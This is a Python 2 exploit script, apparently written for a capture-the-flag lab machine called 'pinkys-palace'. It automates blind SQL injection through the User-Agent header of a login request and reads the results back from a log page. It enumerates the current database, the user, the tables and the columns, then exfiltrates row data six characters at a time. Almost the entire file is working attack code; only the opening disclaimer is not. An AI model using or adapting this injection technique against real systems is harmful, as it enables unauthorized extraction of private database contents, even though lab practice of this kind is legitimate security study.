'''
@Author: Captain Darkshade

Twitter: @cdarkshade
YouTube: Captain Darkshade

Disclaimer: I am not a security professional nor do I consider myself as an expert. 
I am nothing more than a security enthusiast and a beginner at best. Scanning and 
attacking networks and computers without express permission is illegal in many countries. 
Code samples are provided as is and without warranty. All demos conducted in my own isolated lab.

'''

import requests
from termcolor import colored
from lxml import html

information = {
    'tables' : [],
    'data' : []
}

payloads  = [
    {
        'description' : 'Gettng current database', 
        'payload' :"select database()",
        'key' : '+++current_database+++',
        'tokens' : []
    },
    {
        'description' : 'Getting current db user ', 
        'payload' :"select user()",
        'key' : 'current_db_user',
        'tokens' : []
    },
    {
        'description' : 'Getting tables for current database', 
        'payload' : "select table_name from information_schema.tables where table_schema = '+++current_database+++' limit 1 offset +++offset+++" ,
        'key' : 'table',
        'tokens' : ['+++current_database+++', '+++offset+++']
    },
    {
        'description' : 'Getting columns from tables', 
        'payload' : "select column_name from information_schema.columns where table_schema = '+++current_database+++' and table_name = '+++table+++' limit 1 offset +++offset+++" ,
        'key' : 'column',
        'tokens' : ['+++current_database+++', '+++offset+++', '+++table+++']
    },
    {
        'description' : 'Exfiltrating Data', 
        'payload' : "select +++column+++ from +++table+++ limit 1 offset +++offset+++" ,
        'key' : 'data',
        'tokens' : ['+++offset+++', '+++table+++', '+++column+++']
    }
]

proxies = {
    'http' : 'http://localhost:8080'
}

target = "http://pinkys-palace:8080/littlesecrets-main/"

for payload in payloads: # iterate through payloads
    print colored("[i] ", "blue") + payload['description']
    logvalue = 2
    index = 1
    info = ''
    offset = 0
    tableoffset = 0
    columnoffset = 0

    while logvalue > 0: # as long as we retrieve data
        if payload['key'] == 'data' and columnoffset == 0 and offset == 0 and index == 1:
            try:
                exfil = raw_input("Exfil table %s?" % information['tables'][tableoffset].keys()[0])
                if exfil == 'n' or exfil == 'N':
                    tableoffset += 1
                    columnoffset = 0
                    index = 1
                    logvalue =2
                    continue
            except:
                pass
        injection = "1'* conv(hex(substring((%s),%d,6)),16,10)*'1" % (payload['payload'],index)
        if offset == 0 and payload['key'] == 'column' and logvalue == 2:
            try:
                print colored("[i] ", "blue") + "Enumerating table " + information['tables'][tableoffset].keys()[0]
            except:
                pass
        for token in payload['tokens']:
            if token == '+++offset+++':
                injection = injection.replace(token, str(offset))
            elif token == '+++table+++':
                try:
                    injection = injection.replace(token, information['tables'][tableoffset].keys()[0])
                    if offset == 0 and payload['key'] == 'table':
                        print colored("[i] ", "blue") + "Enumerating table: " + information['tables'][tableoffset].keys()[0]
                except:
                    index = 0
                    offset = 0
                    logvalue = 0
                    tableoffset = 0
                    continue
            elif token == '+++column+++':
                try:
                    injection = injection.replace(token, information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'][columnoffset])
                except:
                    index = 1
                    logvalue = 0
                    break
            else:
                injection = injection.replace(token, information[token])
        headers = {
            'User-Agent' : injection
        }
        data = {
            'user' : 'pinky',
            'pass' : 'pinky'
        }
        r = requests.post(target + 'login.php', data=data, headers = headers, proxies=proxies)
        r = requests.get(target + 'logs.php', proxies=proxies)
        if r.status_code >= 200 and r.status_code < 300:
            page = html.fromstring(r.content)
            entries = page.xpath('//h4/text()')
            decimal = entries[-1].split(' ')[3]
            if len(decimal) > 0:
                chunk = hex(int(decimal)).split('x')[1].decode("hex")
                info += chunk
                index += 6
                logvalue = 2
            else:
                logvalue -= 1
                if payload['key'] == 'data':
                    columnoffset += 1
                    if columnoffset > len(information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns']):
                        columnoffset = 0
                        logvalue = 2
                        offset += 1
                elif '+++offset+++' in payload['tokens'] and columnoffset == 0:
                    offset += 1
                    columnoffset = 0
                    if logvalue == 0 and '+++table+++' in payload['tokens']:
                        offset = 0
                        tableoffset += 1
                        logvalue = 2
                else:
                    logvalue = 0
                    offset = 0
                    if len(info) > 0:
                        print colored("[$] ", "green") + payload['key'] + " " + info
                    if payload['key'] == 'table':
                        table = {}
                        table[info] = {'columns' : []}
                        information['tables'].append(table)
                    elif payload['key'] == 'column':
                        information['tables'][tableoffset][information['tables'][tableoffset].keys()[0]]['columns'].append(info)
                    elif payload['key'] == 'data':
                        information['data'].append(info)
                    else:
                        information[payload['key']] = info
                info = ''
                index = 1
                
print information